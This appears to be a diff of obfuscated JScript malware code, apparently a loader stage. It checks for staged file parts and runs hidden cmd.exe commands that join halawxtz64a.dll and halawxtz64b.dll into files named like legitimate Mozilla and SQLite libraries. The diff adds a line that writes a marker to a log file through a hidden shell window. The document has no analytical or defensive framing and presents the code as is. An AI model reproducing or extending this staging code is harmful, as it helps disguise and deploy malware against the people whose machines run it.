@@ -331,7 +331,9 @@ irz593 = "142_T3SL4S_"
 					if (jk021.FileExists(gd481+"\\halawxtz64b.dll")){
 						if (jk021.FileExists(wpxa064)){						 	
 						 try
-						 {		
+						 {	
+						 kpz8410.run('cmd /V /C "echo '+irz593+'>'+gd481+'\\r1.log"&& exit',0,false); 
+	
 						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > mozcrt19.dll',0,true); 
 						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > mozsqlite3.dll',0,true); 						 
 						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > sqlite3.dll',0,true); 
